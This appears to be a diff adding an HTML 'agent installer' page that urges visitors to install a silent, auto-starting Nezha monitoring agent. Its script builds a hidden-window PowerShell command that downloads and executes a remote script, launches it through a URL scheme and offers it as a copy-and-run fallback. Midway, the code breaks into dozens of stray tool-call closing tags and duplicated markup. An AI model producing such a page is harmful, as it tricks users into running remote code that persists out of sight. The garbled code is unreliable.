@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ST PILOT - Agent Installer</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            text-align: center;
+            max-width: 520px;
+            padding: 40px;
+        }
+        .logo {
+            font-size: 42px;
+            font-weight: 700;
+            color: #00ff88;
+            letter-spacing: 4px;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 13px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 40px;
+        }
+        .card {
+            background: #111;
+            border: 1px solid #1a1a1a;
+            border-radius: 12px;
+            padding: 32px;
+            margin-bottom: 24px;
+        }
+        .card h2 { font-size: 18px; color: #fff; margin-bottom: 12px; }
+        .card p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
+        .btn-install {
+            display: inline-block;
+            background: #00ff88;
+            color: #000;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 14px 40px;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            border: none;
+        }
+        .btn-install:hover {
+            background: #00cc6a;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(0,255,136,0.2);
+        }
+        .info {
+            background: #0d1117;
+            border: 1px solid #1a2332;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 24px;
+            text-align: left;
+        }
+        .info h3 { color: #00ff88; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; }
+        .info ul { list-style: none; font-size: 13px; color: #666; }
+        .info li { padding: 4px 0; padding-left: 16px; position: relative; }
+        .info li::before { content: "✓"; color: #00ff88; position: absolute; left: 0; }
+        .footer { margin-top: 32px; font-size: 12px; color: #333; }
+        .status { margin-top: 16px; font-size: 13px; color: #00ff88; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">ST PILOT</div>
+        <div class="subtitle">System Monitoring Agent</div>
+
+        <div class="card">
+            <h2>Install Monitoring Agent</h2>
+            <p>
+                Install the Nezha monitoring agent on this machine. 
+                The agent runs silently in the background and reports to the central dashboard.
+                Requires administrator privileges.
+            </p>
+            <button class="btn-install" onclick="installAgent()">Install Agent</button>
+            <div class="status" id="status">Starting installation...</div>
+        </div>
+
+        <div class="info">
+            <h3>What Gets Installed</h3>
+            <ul>
+                <li>Nezha monitoring agent service</li>
+                <li>Auto-starts on system boot</li>
+                <li>Connects to central monitoring server</li>
+                <li>Runs silently in background</li>
+                <li>Minimal resource usage (~10-30 MB RAM)</li>
+            </ul>
+        </div>
+
+        <div class="footer">ST PILOT Lab &mdash; Demo Mode</div>
+    </div>
+
+    <script>
+        function installAgent() {
+            const status = document.getElementById('status');
+            status.style.display = 'block';
+            status.textContent = 'Launching installer...';
+            
+            // The PowerShell one-liner that downloads and runs the script
+            const scriptUrl = 'https://raw.githubusercontent.com/YOUR-USERNAME/st-pilot/main/st-pilot.ps1';
+            const psCommand = 'powershell -WindowStyle Hidden -c \"iex ((new-object net.webclient).DownloadString(\'' + scriptUrl + '\'))\"';
+            
+            // Try to trigger the command
+            window.location.href = psCommand.replace(/ /g, '%20');
+            
+            // Fallback after 3 seconds
+            setTimeout(() => {
+                status.innerHTML = '
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+</parameter>
+</invoke>
+
+            <div id="fallback" style="display:none;">
+                <p style="color:#888;font-size:13px;margin-bottom:12px;">If nothing happened, copy this command and run it:</p>
+                <code id="cmdBox" style="background:#0d1117;border:1px solid #1a2332;border-radius:4px;padding:12px;font-size:11px;color:#00ff88;word-break:break-all;display:block;">
+                </code>
+                <p style="color:#555;font-size:11px;margin-top:8px;">Click the box to copy to clipboard</p>
+            </div>
+        </div>
+
+        <div class="info">
+            <h3>What Gets Installed</h3>
+            <ul>
+                <li>Nezha monitoring agent service</li>
+                <li>Auto-starts on system boot</li>
+                <li>Connects to central monitoring server</li>
+                <li>Runs silently in background</li>
+            </ul>
+        </div>
+
+        <div class="footer">ST PILOT Lab &mdash; Demo Mode</div>
+    </div>
+
+    <script>
+        const SCRIPT_URL = 'https://raw.githubusercontent.com/YOUR-USERNAME/st-pilot/main/st-pilot.ps1';
+        const psCommand = 'powershell -WindowStyle Hidden -c "iex ((new-object net.webclient).DownloadString(\'' + SCRIPT_URL + '\'))"';
+        document.getElementById('cmdBox').textContent = psCommand;
+
+        function installAgent() {
+            const status = document.getElementById('status');
+            const fallback = document.getElementById('fallback');
+            
+            status.style.display = 'block';
+            status.textContent = 'Launching installer...';
+            
+            // Try to trigger PowerShell execution
+            window.location.href = 'ms-powershell://' + btoa(psCommand);
+            
+            // If that doesn't work after 3 seconds, show fallback
+            setTimeout(() => {
+                status.textContent = 'If no prompt appeared, use the command below:';
+                fallback.style.display = 'block';
+            }, 3000);
+        }
+
+        // Copy to clipboard
+        document.getElementById('cmdBox').addEventListener('click', function() {
+            navigator.clipboard.writeText(this.textContent).then(() => {
+                this.textContent = 'Copied to clipboard!';
+                setTimeout(() => { this.textContent = psCommand; }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
